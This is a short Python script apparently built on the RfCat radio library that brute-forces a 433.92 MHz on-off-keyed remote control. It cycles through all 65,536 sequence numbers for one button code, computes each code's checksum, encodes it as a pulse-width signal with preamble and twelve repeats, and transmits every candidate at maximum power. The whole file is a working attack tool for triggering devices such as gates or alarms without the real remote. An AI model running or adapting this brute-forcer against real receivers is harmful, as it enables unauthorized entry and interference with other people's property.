#!/usr/bin/env python

import sys
import time
from rflib import *
from struct import *

d = RfCat()
keyLen = 0
baudRate = 1/0.00210*4

def ConfigureD(d):
        d.setMdmModulation(MOD_ASK_OOK)
        d.setFreq(433920000)
        d.makePktFLEN(keyLen)
        d.setMdmSyncMode(0)
        d.setMdmDRate(baudRate)
        d.setMaxPower()

ConfigureD(d)

def checksumRemote(seqNumber, button):
    return (((seqNumber>>8) + (seqNumber&0xFF) + button) & 0xFF)

#key = 0x964D2205
#key = 0x964D2104

#seq = 0x0240
seq = 0x0000
button = 0x21
while seq < 0x10000:

    key = seq<<16 | button<<8 | checksumRemote(seq,button)
    print "key: ",format(key,'08X')

    key = key + 0x100000000 # add a leading bit to not loose fisrt 0
    binKey = bin(key)

    currentStrKey = "100000" # prembule 1 + 1ms = 100000
    strKey = str(binKey)[3:]
    for currentBit in strKey:
            if(currentBit == "0"):
                    currentStrKey = currentStrKey + "1110" # 150ms up, 50ms down
            if(currentBit == "1"):
                    currentStrKey = currentStrKey + "1000" # 50ms up, 150ms down

    finalStrKey = currentStrKey + "10000000000"  # leading
    #print "Binary (PWM) key: ",finalStrKey

    finalStrKey = finalStrKey * 12  # repeat 12 time

    readyKey = ''.join(chr(int(finalStrKey[i:i+8], 2)) for i in xrange(0, len(finalStrKey), 8))

    keyLen = len(readyKey)

    d.RFxmit(readyKey)

    seq+=1
